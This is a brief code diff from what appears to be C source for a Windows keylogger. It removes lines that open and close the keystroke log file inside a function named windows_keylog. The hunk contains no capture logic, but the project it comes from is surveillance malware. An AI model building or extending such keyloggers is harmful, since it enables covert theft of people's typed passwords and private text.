@@ -298,11 +298,6 @@ int CheckSpecialKey(int data) {
 // Keylogger for Windows
 void windows_keylog(const char* filePath) {
 
-    // Clear the log file
-    FILE *temp;
-    temp = fopen(filePath, "a+");
-    fclose(temp);
-
     // Write the header into the file
     winWriteHeader(filePath);
 
